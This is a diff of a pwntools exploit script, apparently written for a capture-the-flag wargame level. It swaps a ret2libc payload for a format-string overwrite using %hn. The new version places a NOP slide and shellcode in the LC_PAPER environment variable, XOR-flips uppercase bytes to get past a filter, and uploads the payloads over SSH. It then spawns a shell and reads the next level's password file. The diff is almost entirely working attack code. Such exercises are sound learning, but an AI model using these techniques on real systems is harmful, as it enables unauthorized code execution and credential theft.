@@ -47,38 +47,66 @@ def get_connection(custom_env=None, argv=None):
         return shell.process(final_argv, env=final_env)
 
 
+def xore(data):
+    # On s'assure que 'data' est un bytearray pour pouvoir le modifier (b"aa" → bytearray(b"aa"))
+    if isinstance(data, bytes):
+        data = bytearray(data)
+    for i in range(len(data)):
+        if data[i] > 64 and data[i] <= 90:
+            data[i] ^= 32
+    return bytes(data)
+
+
 def exploit():
 
-    address_system = 0xf7e6aed0
-    address_return = 0xf7e5eb70
-    address_bin_sh = 0xf7f897ec
-    payload = b"A" * 156 + p32(address_system) + p32(address_return) + p32(address_bin_sh)
+ 
 
-    conn = get_connection()
+    
+    shellcode = asm(shellcraft.i386.linux.sh())
+    nop_slide = b"\x90" * 100
+    paylod_env = nop_slide + shellcode 
+
+    
+    payload_arg = p32(0x80497e0) + p32(0x80497e0 + 2) \
+    + b"%55165d" + b"%10$hn" \
+    + b"%10362d" + b"%11$hn"
+    
+    print(payload_arg)
+
+    payload_arg = xore(payload_arg)
+    print(payload_arg)
+
+    conn = get_connection(
+        custom_env={
+            "LC_PAPER": paylod_env
+        }
+    )
 
     if LOCAL:
         gdb.attach(conn, '''
-          break *main
+          break *p+28
           continue
           ''')
 
-    print(conn.recvuntil(b'Give me some shellcode, k\n'))
-    conn.sendline(payload)
-    print(payload)
+    conn.sendline(payload_arg)
+    print(payload_arg)
 
+
+    if not LOCAL and SSH_SESSION is not None:
+        SSH_SESSION.upload_data(payload_arg, "/tmp/payload")
+        SSH_SESSION.upload_data(paylod_env, "/tmp/shellcode")
+        print("Payloads uploaded to /tmp/payload on remote server.")
 
 
     try:
         if not LOCAL:
             conn.recvuntil(b'$')
-            conn.sendline('cat /home/users/level05/.pass')
+            conn.sendline(b'cat /home/users/level06/.pass')
             flag = conn.recvline()
             print("\n=== Flag ===")
             print(flag.decode())
-            conn.interactive()
-
-        # conn.interactive()
-
+        conn.interactive()
+    
     except EOFError:
         print("EOFError")
         pass
@@ -91,7 +119,5 @@ def exploit():
    
 if __name__ == "__main__":
     exploit()
-
-
 
 
